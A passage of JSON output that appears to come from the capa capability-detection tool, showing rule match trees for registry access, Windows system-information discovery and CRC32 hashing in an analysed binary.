                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651782425
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenCurrentUser"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegOpenUserClassesRoot"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RegCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwOpenKeyTransactedEx"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "ZwCreateKeyTransacted"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtOpenKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "NtCreateKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegOpenUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "SHRegCreateUSKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "RtlCreateRegistryKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "api",
                                  "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651782064
                        },
                        {
                          "type": "absolute",
                          "value": 1651782384
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegEnumKeyEx"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651782374
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RegQueryInfoKeyA"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQueryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwEnumerateKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtEnumerateKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlCheckRegistryKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHEnumKeyEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHQueryInfoKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegEnumUSKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SHRegQueryInfoUSKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::GetSubKeyNames"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get system information on Windows": {
        "meta": {
          "name": "get system information on Windows",
          "namespace": "host-interaction/os/info",
          "authors": [
            "moritz.raabe@mandiant.com",
            "joakim@intezer.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x140002280"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get system information on Windows\r\n    namespace: host-interaction/os/info\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - joakim@intezer.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    examples:\r\n      - 563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x140002280\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - or:\r\n        - api: kernel32.GetSystemInfo\r\n        - api: kernel32.GetNativeSystemInfo\r\n        - api: NtQuerySystemInformation\r\n        - api: NtQuerySystemInformationEx\r\n        - api: ntdll.RtlGetNativeSystemInformation\r\n        - api: ZwQuerySystemInformation\r\n        - api: ZwQuerySystemInformationEx\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651776848
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetSystemInfo"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651776965
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetNativeSystemInfo"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQuerySystemInformation"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQuerySystemInformationEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "RtlGetNativeSystemInformation"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQuerySystemInformation"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ZwQuerySystemInformationEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "hash data with CRC32": {
        "meta": {
          "name": "hash data with CRC32",
          "namespace": "data-manipulation/checksum/crc32",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Data",
                "Checksum",
                "CRC32"
              ],
              "objective": "Data",
              "behavior": "Checksum",
              "method": "CRC32",
              "id": "C0032.001"
            }
          ],
          "references": [],
          "examples": [
            "2D3EDC218A90F03089CC01715A9F047F:0x403CBD",
            "7D28CB106CB54876B2A5C111724A07CD:0x402350",
            "7EFF498DE13CC734262F87E6B3EF38AB:0x100084A6"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: hash data with CRC32\r\n    namespace: data-manipulation/checksum/crc32\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires operand[1].number, characteristic, bytes, mnemonic features\r\n    mbc:\r\n      - Data::Checksum::CRC32 [C0032.001]\r\n    examples:\r\n      - 2D3EDC218A90F03089CC01715A9F047F:0x403CBD\r\n      - 7D28CB106CB54876B2A5C111724A07CD:0x402350  # RtlComputeCrc32\r\n      - 7EFF498DE13CC734262F87E6B3EF38AB:0x100084A6\r\n  features:\r\n    - or:\r\n      - and:\r\n        - number: 1 = bits in a byte\r\n        - instruction:\r\n          - description: is bit set?\r\n          - or:\r\n            - mnemonic: and\r\n            - mnemonic: test\r\n          - operand[1].number: 1\r\n        - instruction:\r\n          - mnemonic: shr\r\n          - number: 1\r\n        - characteristic: nzxor\r\n        - operand[1].number: 0xEDB88320\r\n      - and:\r\n        - number: 0x8320\r\n        - number: 0xEDB8\r\n        - characteristic: nzxor\r\n      - api: RtlComputeCrc32\r\n      - bytes: 00 00 00 00 96 30 07 77 2C 61 0E EE BA 51 09 99 19 C4 6D 07 8F F4 6A 70 35 A5 63 E9 A3 95 64 9E = crc32_tab\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651777136
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlComputeCrc32"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "bytes",
                      "bytes": "00000000963007772c610eeeba51099919c46d078ff46a7035a563e9a395649e",
                      "description": "crc32_tab"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 33568
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 60856
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "nzxor"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651777216
                        },
                        {
                          "type": "absolute",
                          "value": 1651777280
                        },
                        {
                          "type": "absolute",
                          "value": 1651777190
                        },
                        {
                          "type": "absolute",
                          "value": 1651777255
                        },
                        {
                          "type": "absolute",
                          "value": 1651777229
                        },
                        {
                          "type": "absolute",
                          "value": 1651777203
                        },
                        {
                          "type": "absolute",
                          "value": 1651777268
                        },
                        {
                          "type": "absolute",
                          "value": 1651777176
                        },
                        {
                          "type": "absolute",
                          "value": 1651777242
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 1,
                          "description": "bits in a byte"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651777220
                        },
                        {
                          "type": "absolute",
                          "value": 1651777222
                        },
                        {
                          "type": "absolute",
                          "value": 1651777168
                        },
                        {
                          "type": "absolute",
                          "value": 1651777233
                        },
                        {
                          "type": "absolute",
                          "value": 1651777235
                        },
                        {
                          "type": "absolute",
                          "value": 1651777209
                        },
                        {
                          "type": "absolute",
                          "value": 1651777181
                        },
                        {
                          "type": "absolute",
                          "value": 1651777246
                        },
                        {
                          "type": "absolute",
                          "value": 1651777183
                        },
                        {
                          "type": "absolute",
                          "value": 1651777248
                        },
                        {
                          "type": "absolute",
                          "value": 1651777194
                        },
                        {
                          "type": "absolute",
                          "value": 1651777259
                        },
                        {
                          "type": "absolute",
                          "value": 1651777196
                        },
                        {
                          "type": "absolute",
                          "value": 1651777261
                        },
                        {
                          "type": "absolute",
                          "value": 1651777207
                        },
                        {
                          "type": "absolute",
                          "value": 1651777273
                        },
                        {
                          "type": "absolute",
                          "value": 1651777276
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "subscope",
                          "scope": "instruction"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777248
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777248
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777222
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777222
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777196
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777196
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777261
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777261
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777235
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777235
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777209
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777209
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777276
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777276
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand number",
                                  "index": 1,
                                  "operand_number": 1
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651777183
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "and"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651777183
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "mnemonic",
                                      "mnemonic": "test"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651777248
                        },
                        {
                          "type": "absolute",
                          "value": 1651777222
                        },
                        {
                          "type": "absolute",
                          "value": 1651777196
                        },
                        {
                          "type": "absolute",
                          "value": 1651777261
                        },
                        {
                          "type": "absolute",
                          "value": 1651777235
                        },
                        {
                          "type": "absolute",
                          "value": 1651777209
                        },
                        {
                          "type": "absolute",
                          "value": 1651777276
                        },
                        {
                          "type": "absolute",
                          "value": 1651777183
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "subscope",
                          "scope": "instruction"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "shr"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
